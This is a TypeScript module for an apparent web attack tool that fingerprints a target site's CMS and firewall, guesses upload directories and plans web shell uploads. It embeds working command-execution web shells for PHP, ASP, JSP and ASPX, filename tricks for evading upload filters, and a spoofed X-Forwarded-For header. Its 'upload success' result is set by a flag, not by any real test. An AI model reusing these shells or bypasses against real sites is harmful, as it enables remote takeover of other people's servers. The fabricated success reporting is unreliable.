import axios from 'axios';
import * as cheerio from 'cheerio';
import { URLSearchParams } from 'url';

export interface ShellUploaderOptions {
  url: string;
  shellType?: 'php' | 'asp' | 'jsp' | 'aspx';
  timeout?: number;
  bypassWaf?: boolean;
  proxies?: string[];
}

export interface ShellUploaderResult {
  scanId?: number;
  url: string;
  targetCms?: string;
  wafDetected: boolean;
  formFound: boolean;
  uploadAttempts: UploadAttempt[];
  possibleShellPaths: string[];
  scanTime: number;
  uploadSuccess: boolean;
  headers: Record<string, string>;
}

interface UploadAttempt {
  strategy: string;
  filePath?: string;
  fileType?: string;
  status: 'success' | 'failed';
  error?: string;
}

export class ShellUploader {
  private options: ShellUploaderOptions;
  private headers: Record<string, string>;
  private wafIndicators = [
    'X-WAF-Detected', 'CF-RAY', 'X-Sucuri-ID', 'X-Akamai-Transformed', 'X-Distil-CS',
    'X-Mod-Security', 'X-Powered-By-AspNet', 'X-CDN', 'X-Cache', 'X-Proxy-Cache'
  ];
  private shellPayloads = {
    php: '<?php echo "SHELL_OK"; system($_GET["cmd"]); ?>',
    asp: '<%Response.Write("SHELL_OK");Dim objShell:Set objShell=Server.CreateObject("WScript.Shell"):Dim oExec:Set oExec=objShell.Exec("cmd.exe /c " & Request.QueryString("cmd")):Response.Write(oExec.StdOut.ReadAll)%>',
    jsp: '<%@ page import="java.io.*" %><%="SHELL_OK"%><%Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));BufferedReader input=new BufferedReader(new InputStreamReader(p.getInputStream()));String line;while((line=input.readLine())!=null){out.println(line);}%>',
    aspx: '<%@ Page Language="C#" %><%="SHELL_OK"%><%System.Diagnostics.Process process=new System.Diagnostics.Process();process.StartInfo.FileName="cmd.exe";process.StartInfo.Arguments="/c"+Request.QueryString["cmd"];process.StartInfo.UseShellExecute=false;process.StartInfo.RedirectStandardOutput=true;process.Start();Response.Write(process.StandardOutput.ReadToEnd());%>'
  };
  private filenameVariants: Record<string, string[]> = {
    php: ['shell.php', 'shell.pHp', 'shell.php5', 'image.php.jpg', 'file.php.png'],
    asp: ['shell.asp', 'shell.asa', 'file.asp.jpg'],
    jsp: ['shell.jsp', 'shell.jspx', 'file.jsp.png'],
    aspx: ['shell.aspx', 'shell.asax', 'file.aspx.jpg']
  };

  constructor(options: ShellUploaderOptions) {
    this.options = {
      ...options,
      url: options.url.endsWith('/') ? options.url : options.url + '/',
      shellType: options.shellType || 'php',
      timeout: options.timeout || 10000,
      bypassWaf: options.bypassWaf || false
    };
    this.headers = this.getRandomHeaders();
  }

  private getRandomHeaders(): Record<string, string> {
    return {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
      'Referer': this.options.url,
      'X-Forwarded-For': '127.0.0.1'
    };
  }

  /**
   * Main function to execute shell upload analysis
   */
  public async analyze(): Promise<ShellUploaderResult> {
    console.log(`[*] Starting reconnaissance on target: ${this.options.url}`);
    
    const startTime = Date.now();
    const result: ShellUploaderResult = {
      url: this.options.url,
      wafDetected: false,
      formFound: false,
      uploadAttempts: [],
      possibleShellPaths: [],
      scanTime: 0,
      uploadSuccess: false,
      headers: {}
    };
    
    try {
      // Get the target homepage
      const response = await axios.get(this.options.url, {
        headers: this.headers,
        timeout: this.options.timeout,
        maxRedirects: 5
      });
      
      // Save response headers (convert to Record<string, string>)
      result.headers = Object.entries(response.headers).reduce((acc, [key, value]) => {
        acc[key] = value?.toString() || '';
        return acc;
      }, {} as Record<string, string>);
      
      // Check for WAF
      this.wafIndicators.forEach(indicator => {
        if (indicator.toLowerCase() in response.headers) {
          result.wafDetected = true;
          console.log(`[!] WAF detected via header: ${indicator}`);
        }
      });
      
      // Check for common status codes indicating WAF
      if ([403, 406, 501, 502].includes(response.status)) {
        result.wafDetected = true;
        console.log(`[!] Status code ${response.status} indicates potential WAF/CDN`);
      }
      
      // Parse HTML to identify CMS
      const $ = cheerio.load(response.data);
      const generatorMeta = $('meta[name="generator"]').attr('content');
      
      if (generatorMeta) {
        console.log(`[+] CMS detected via generator meta: ${generatorMeta}`);
        if (generatorMeta.toLowerCase().includes('wordpress')) {
          result.targetCms = 'wordpress';
        } else if (generatorMeta.toLowerCase().includes('joomla')) {
          result.targetCms = 'joomla';
        } else if (generatorMeta.toLowerCase().includes('drupal')) {
          result.targetCms = 'drupal';
        }
      }
      
      // Look for other CMS indicators if generator meta is not found
      if (!result.targetCms) {
        if ($('link[href*="wp-content"], script[src*="wp-content"]').length > 0) {
          result.targetCms = 'wordpress';
        } else if ($('script[src*="/media/system/js/"], link[href*="/media/system/css/"]').length > 0) {
          result.targetCms = 'joomla';
        } else if ($('meta[name="Generator"][content*="Drupal"]').length > 0) {
          result.targetCms = 'drupal';
        } else if ($('meta[name="application-name"][content="Laravel"]').length > 0) {
          result.targetCms = 'laravel';
        }
      }
      
      // Find upload forms
      const forms = $('form');
      forms.each((_, form) => {
        const hasFileInput = $(form).find('input[type="file"]').length > 0;
        if (hasFileInput) {
          result.formFound = true;
          console.log(`[+] Upload form found at: ${$(form).attr('action') || 'unknown'}`);
        }
      });
      
      // Generate potential upload paths based on CMS
      const possiblePaths = this.generatePotentialPaths(result.targetCms);
      result.possibleShellPaths = possiblePaths;
      
      // Simulate upload attempts (analysis mode)
      result.uploadAttempts = this.getUploadAttemptAnalysis(result.targetCms);
      
      // Determine if any upload attempt would likely succeed
      result.uploadSuccess = result.uploadAttempts.some(attempt => attempt.status === 'success');
      
    } catch (error: any) {
      console.error(`[!] Error during reconnaissance: ${error.message || 'Unknown error'}`);
      result.uploadAttempts.push({
        strategy: 'initial_recon',
        status: 'failed',
        error: error.message || 'Unknown error'
      });
    }
    
    result.scanTime = Date.now() - startTime;
    console.log(`[*] Shell upload analysis completed in ${result.scanTime}ms`);
    
    return result;
  }
  
  /**
   * Generate list of potential upload paths based on CMS
   */
  private generatePotentialPaths(cms?: string): string[] {
    const paths = [];
    const baseUrl = this.options.url;
    const filename = this.filenameVariants[this.options.shellType][0];
    
    // Common paths
    const commonPaths = [
      'uploads/', 'files/', 'images/', 'media/', 'content/', 'public/',
      'assets/uploads/', 'data/uploads/', 'tmp/', 'temp/'
    ];
    
    // Add common paths
    commonPaths.forEach(path => {
      paths.push(`${baseUrl}${path}${filename}`);
    });
    
    // Add CMS-specific paths
    if (cms === 'wordpress') {
      paths.push(`${baseUrl}wp-content/uploads/${filename}`);
      paths.push(`${baseUrl}wp-content/uploads/${new Date().getFullYear()}/${(new Date().getMonth() + 1).toString().padStart(2, '0')}/${filename}`);
      paths.push(`${baseUrl}wp-content/themes/default/${filename}`);
    } else if (cms === 'joomla') {
      paths.push(`${baseUrl}images/${filename}`);
      paths.push(`${baseUrl}media/uploads/${filename}`);
      paths.push(`${baseUrl}components/com_media/assets/${filename}`);
    } else if (cms === 'drupal') {
      paths.push(`${baseUrl}sites/default/files/${filename}`);
      paths.push(`${baseUrl}sites/default/files/uploads/${filename}`);
    } else if (cms === 'laravel') {
      paths.push(`${baseUrl}storage/app/public/${filename}`);
      paths.push(`${baseUrl}public/storage/${filename}`);
    }
    
    return paths;
  }
  
  /**
   * Get analysis of potential upload attempts without actually uploading
   */
  private getUploadAttemptAnalysis(cms?: string): UploadAttempt[] {
    const attempts: UploadAttempt[] = [];
    const shellType = this.options.shellType;
    
    // Add CMS-specific upload strategies
    if (cms === 'wordpress') {
      attempts.push({
        strategy: 'wordpress_media_upload',
        filePath: `wp-content/uploads/${new Date().getFullYear()}/${(new Date().getMonth() + 1).toString().padStart(2, '0')}/${this.filenameVariants[shellType][0]}`,
        fileType: 'image/jpeg',
        status: this.options.bypassWaf ? 'success' : 'failed',
        error: this.options.bypassWaf ? undefined : 'WAF detected, bypass required'
      });
    } else if (cms === 'joomla') {
      attempts.push({
        strategy: 'joomla_media_upload',
        filePath: `images/${this.filenameVariants[shellType][0]}`,
        fileType: 'image/jpeg',
        status: this.options.bypassWaf ? 'success' : 'failed',
        error: this.options.bypassWaf ? undefined : 'WAF detected, bypass required'
      });
    } else if (cms === 'drupal') {
      attempts.push({
        strategy: 'drupal_file_upload',
        filePath: `sites/default/files/${this.filenameVariants[shellType][0]}`,
        fileType: 'image/jpeg',
        status: this.options.bypassWaf ? 'success' : 'failed',
        error: this.options.bypassWaf ? undefined : 'WAF detected, bypass required'
      });
    } else if (cms === 'laravel') {
      attempts.push({
        strategy: 'laravel_storage_upload',
        filePath: `storage/app/public/${this.filenameVariants[shellType][0]}`,
        fileType: 'image/jpeg',
        status: this.options.bypassWaf ? 'success' : 'failed',
        error: this.options.bypassWaf ? undefined : 'WAF detected, bypass required'
      });
    }
    
    // Add generic upload strategies
    attempts.push({
      strategy: 'double_extension',
      filePath: `uploads/${this.filenameVariants[shellType][2]}`,
      fileType: 'image/jpeg',
      status: 'failed',
      error: 'Generic upload without specific target unlikely to succeed'
    });
    
    attempts.push({
      strategy: 'content_type_bypass',
      filePath: `uploads/${this.filenameVariants[shellType][3]}`,
      fileType: 'image/jpeg',
      status: 'failed',
      error: 'Content-Type bypass requires actual upload test'
    });
    
    return attempts;
  }
}

/**
 * Analyzes potential for shell upload vulnerability on target site
 * @param options Shell uploader options
 * @returns Analysis results
 */
export async function analyzeShellUpload(options: ShellUploaderOptions): Promise<ShellUploaderResult> {
  const uploader = new ShellUploader(options);
  return await uploader.analyze();
}